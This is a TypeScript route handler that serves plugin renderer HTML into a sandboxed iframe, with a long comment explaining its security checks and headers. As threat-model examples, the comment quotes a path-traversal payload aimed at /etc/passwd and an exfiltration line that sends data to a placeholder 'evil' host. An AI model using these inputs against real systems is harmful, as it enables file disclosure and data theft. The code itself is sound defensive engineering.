import { lstat, readFile, realpath } from "node:fs/promises";
import * as path from "node:path";
import { getPlugin } from "@/lib/db/plugins";
import { SIGNED_OUT } from "@/lib/error-copy";
import { pluginDir } from "@/lib/plugins/install";
import { getServerSession } from "@/lib/session/get-server-session";

/**
 * Serves an enabled plugin's `renderers/<file>.html` — the ONE place
 * plugin-authored code reaches a browser (`PluginRenderer`,
 * `components/tool-call/renderers/plugin-renderer.tsx`, loads this in a
 * sandboxed `<iframe>`). Everything else a plugin does runs in
 * `@paco/plugin-host`'s worker process, never in the Next.js process or a
 * browser; a renderer is the documented exception, so this route is the
 * single point where the isolation has to hold on its own — browser
 * sandboxing (the iframe's `sandbox` attribute) instead of process
 * isolation.
 *
 * Everything below happens in a fixed order for a reason:
 *
 * 0. A signed-in session is required, same as every other app route — the
 *    served HTML isn't user-specific, but there is no reason to serve it to
 *    an unauthenticated caller, and skipping this would let anyone who
 *    guesses an enabled plugin id + filename fetch it directly.
 * 1. Both path segments are validated against a strict allowlist BEFORE
 *    any `fs`/db call touches them. Neither pattern permits `/`, so a
 *    traversal payload like `..%2f..%2fetc%2fpasswd` (which Next.js
 *    URL-decodes into the raw segment before this handler ever sees it)
 *    fails the regex outright — there is no path-joining step for it to
 *    survive.
 * 2. The plugin must be both installed AND enabled (`getPlugin` — the same
 *    validated-row accessor `apps/web/lib/db/plugins.ts` exposes to every
 *    other caller). A disabled plugin's renderer is refused exactly like
 *    an unknown one: both are a plain 404, so this endpoint never confirms
 *    or denies which plugin ids exist versus which happen to be off.
 * 3. `lstat` (not `stat`) on the exact requested path, rejecting outright
 *    if it is a symlink — regardless of what it points at, even another
 *    file inside the same `renderers/` directory. This mirrors
 *    `apps/web/lib/plugins/content-hash.ts`'s `findSymlink`, which already
 *    rejects a symlink anywhere in a plugin's tree at install time; a
 *    symlink should never exist here, but a renderer is untrusted
 *    plugin-authored content served straight into a browser, so this route
 *    checks again rather than assuming that invariant held.
 * 4. `realpath` on both the resolved file and its containing `renderers`
 *    directory, then a containment check: the file's real parent must
 *    equal the directory's own real path. This is the actual traversal
 *    guard — it catches a symlinked ancestor directory (say, the plugin's
 *    own install directory) resolving somewhere unexpected, which `lstat`
 *    on the leaf alone would not.
 *
 * Response headers:
 *
 * - `Content-Security-Policy: default-src 'none'; script-src
 *   'unsafe-inline'; style-src 'unsafe-inline'; frame-ancestors 'self'` —
 *   the served document can run its own inline `<script>`/`<style>` (that
 *   is how a renderer talks to its parent frame and styles itself) but
 *   cannot load ANY external resource: no images, fonts, frames,
 *   `fetch`/`XHR`, or nested navigation targets. `frame-ancestors` is
 *   listed separately and deliberately: unlike most fetch directives, it
 *   does **not** fall back to `default-src` — omitting it would leave
 *   `default-src 'none'` doing nothing at all to restrict who may embed
 *   this document, and ANY third-party site could iframe this URL without
 *   a `sandbox` attribute, giving the document real, same-origin access to
 *   Paco's cookies and `localStorage`. `'self'` matches
 *   `apps/web/lib/preview/nginx-config.ts`'s handling of the analogous
 *   preview surface.
 * - `X-Frame-Options: SAMEORIGIN` — the same restriction again, for
 *   browsers that predate or ignore `frame-ancestors`. Belt-and-suspenders
 *   with the CSP directive above, not a substitute for it.
 *
 * What this does NOT prevent: the iframe embedding this document is
 * sandboxed with `sandbox="allow-scripts"` and no `allow-same-origin`
 * (`plugin-renderer.tsx`), which stops it from reading Paco's origin
 * storage/cookies and from navigating any OTHER frame (no
 * `allow-top-navigation`, no `allow-popups`). It does **not** stop the
 * document from navigating ITSELF — `location.href = "https://evil/?d=" +
 * data` is always available to a sandboxed frame with only
 * `allow-scripts`, in every shipping browser, and no CSP directive here
 * closes that off (`connect-src`/`default-src 'none'` restricts
 * *fetch/XHR/WebSocket*, not top-level navigation of the frame's own
 * document). Given that, `postMessage` to the parent is this document's
 * *intended* channel out, not its *only* one — the actual mitigation is
 * that the payload handed to it (`buildPluginToolCallMessage`,
 * `plugin-renderer.tsx`) is minimal: this one tool call's own `input`/
 * `output`, nothing ambient from Paco's session.
 */

/**
 * Matches `packages/plugin-kit/manifest.ts`'s `pluginManifestSchema.name`
 * pattern exactly (`^[a-z][a-z0-9-]{1,63}$`) — a plugin id can never
 * contain `/`, `.`, or any character `path.join` could treat specially, so
 * there is no way to smuggle a traversal segment through this parameter
 * even before the later realpath containment check runs.
 */
const PLUGIN_ID_PATTERN = /^[a-z][a-z0-9-]{1,63}$/;

/**
 * A renderer file name: lowercase letters, digits, `_`/`-`, then a literal
 * `.html` — no `/`, no `..`, no leading dot. Discovery
 * (`packages/plugin-kit/discovery.ts`) only ever lists `renderers/*.html`
 * files whose basenames satisfy this, so a legitimate request always
 * matches; anything else — an encoded slash, a `..` segment, a different
 * extension — is rejected before it is ever joined onto a directory path.
 */
const RENDERER_FILE_PATTERN = /^[a-z0-9_-]+\.html$/;

/**
 * `frame-ancestors 'self'` is not implied by `default-src 'none'` —
 * `frame-ancestors` is excluded from the fetch-directive fallback chain by
 * spec, so it must be listed explicitly or embedding is left unrestricted.
 * `X-Frame-Options: SAMEORIGIN` is set alongside it for browsers that don't
 * honor `frame-ancestors`. Both restrict WHO may embed this document (an
 * origin check); neither is what stops the embedded document from reaching
 * Paco's storage/cookies — that's the iframe's own `sandbox` attribute,
 * which lives in `plugin-renderer.tsx`, not here.
 */
const RESPONSE_HEADERS = {
  "content-type": "text/html; charset=utf-8",
  "content-security-policy":
    "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; frame-ancestors 'self'",
  "x-frame-options": "SAMEORIGIN",
} as const;

function notFound(): Response {
  return new Response("Not found", { status: 404 });
}

export async function GET(
  _request: Request,
  { params }: { params: Promise<{ pluginId: string; file: string }> },
) {
  const session = await getServerSession();
  if (!session?.user) {
    return Response.json({ error: SIGNED_OUT }, { status: 401 });
  }

  const { pluginId, file } = await params;

  // Step 1: allowlist both segments before any fs or db call sees them.
  if (!(PLUGIN_ID_PATTERN.test(pluginId) && RENDERER_FILE_PATTERN.test(file))) {
    return notFound();
  }

  // Step 2: installed AND enabled — a disabled plugin 404s exactly like an
  // unknown one.
  const plugin = await getPlugin(pluginId);
  if (!plugin?.enabled) {
    return notFound();
  }

  const renderersDir = path.join(pluginDir(pluginId), "renderers");
  const requestedPath = path.join(renderersDir, file);

  // Step 3: reject a symlinked renderer outright, whatever it points at.
  let stat: Awaited<ReturnType<typeof lstat>>;
  try {
    stat = await lstat(requestedPath);
  } catch {
    return notFound();
  }
  if (!stat.isFile()) {
    return notFound();
  }

  // Step 4: realpath containment — catches a symlinked ancestor directory
  // that `lstat` on the leaf file alone would not.
  let realRenderersDir: string;
  let realRequestedPath: string;
  try {
    realRenderersDir = await realpath(renderersDir);
    realRequestedPath = await realpath(requestedPath);
  } catch {
    return notFound();
  }
  if (path.dirname(realRequestedPath) !== realRenderersDir) {
    return notFound();
  }

  let html: string;
  try {
    html = await readFile(realRequestedPath, "utf-8");
  } catch {
    return notFound();
  }

  return new Response(html, {
    status: 200,
    headers: RESPONSE_HEADERS,
  });
}
